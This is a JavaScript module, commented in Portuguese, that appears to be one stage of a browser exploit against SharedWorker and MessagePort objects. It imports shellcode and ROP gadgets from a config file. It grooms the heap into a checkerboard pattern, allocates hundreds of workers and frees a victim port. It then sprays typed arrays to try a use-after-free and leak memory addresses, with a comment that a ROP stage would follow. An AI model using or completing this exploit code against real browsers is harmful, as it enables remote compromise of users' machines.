import { CONFIG, GADGETS, SHELLCODE_HEX } from './config.mjs';
import { log, hexToBytes } from './utils.mjs';
import { prepare_checkerboard_heap } from './heap.mjs';

var workers_stash = [];
var current_test_idx = 0;

export async function start_auto_test() {
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
    log(">>> INICIANDO CAÇADA DE LEAK DINÂMICA <<<", "success");
    test_next_size();
}

function test_next_size() {
    if (current_test_idx >= CONFIG.SIZES_TO_TEST.length) {
        log("FIM DO CICLO. Tente recarregar para limpar a memória.", "fail");
        return;
    }

    const size = CONFIG.SIZES_TO_TEST[current_test_idx];
    log(`[...] Testando Tamanho: 0x${size.toString(16).toUpperCase()}`);

    // 1. Prepara o Heap com buracos desse tamanho específico
    prepare_checkerboard_heap(size);
    
    // 2. Inicia Trigger
    run_trigger_sequence(size);
}

function run_trigger_sequence(size) {
    let p_count = 0;
    // Vamos até 403 (Limite seguro)
    const limit = CONFIG.WORKER_LIMIT - 380; 

    const interval = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval);
            
            // Pega a vítima (403)
            const victim = workers_stash.pop();
            const result = attempt_leak(victim, size);
            
            // Limpa tudo
            cleanup_round();
            
            if (result) {
                log("!!! LEAK ENCONTRADO !!!", "success");
                // Aqui iniciaríamos a Fase 2 (ROP) com a base calculada
            } else {
                current_test_idx++;
                setTimeout(test_next_size, 1000);
            }
            return;
        }

        try {
            // Aloca na zona preparada
            let w = new SharedWorker("data:text/javascript,1", "leak_" + size + "_" + p_count);
            w.port.start();
            workers_stash.push(w);
        } catch(e) {}
        
        p_count++;
    }, 50);
}

function attempt_leak(victim, size) {
    const port = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY DE LEITURA
    // Preenchemos com 0x00 para ver se algo "brota" lá (ponteiros residuais)
    // ou com um padrão para verificar sobreposição.
    const spray_buf = new Uint32Array(size / 4);
    spray_buf.fill(0xCAFEBABE); 
    
    const spray = [];
    for (let k = 0; k < 5000; k++) {
        spray.push(new Uint32Array(spray_buf));
    }

    // 3. SONDA
    try {
        // Tentamos ler propriedades da porta.
        // Se o UAF funcionou e o spray cobriu, a porta deve estar corrompida.
        // Se conseguirmos ler algo diferente do padrão, é um ponteiro.
        
        // Força uma operação que pode revelar endereços em mensagens de erro
        // ou retorno de propriedades
        const debug_str = port.toString(); 
        
        if (debug_str.includes("MessagePort")) {
            // Falha padrão: Objeto não foi substituído
            return false;
        } else {
            // SUCESSO: O objeto mudou de tipo!
            log(`CORRUPÇÃO DETECTADA no tamanho 0x${size.toString(16)}!`, "success");
            
            // Tenta extrair dados (Isso varia conforme o que sobrescrevemos)
            // Se fosse um ArrayBuffer, leríamos o .byteLength
            alert("Objeto corrompido! Tamanho: " + size);
            return true;
        }
    } catch (e) {
        // Às vezes o erro contém o endereço de memória que falhou!
        log(`Erro (Analise se há hex): ${e}`, "fail");
        // Se o erro mencionar "access violation at 0x8...", é o LEAK.
    }
    
    return false;
}

function cleanup_round() {
    workers_stash.forEach(w => w.port.close());
    workers_stash = [];
}
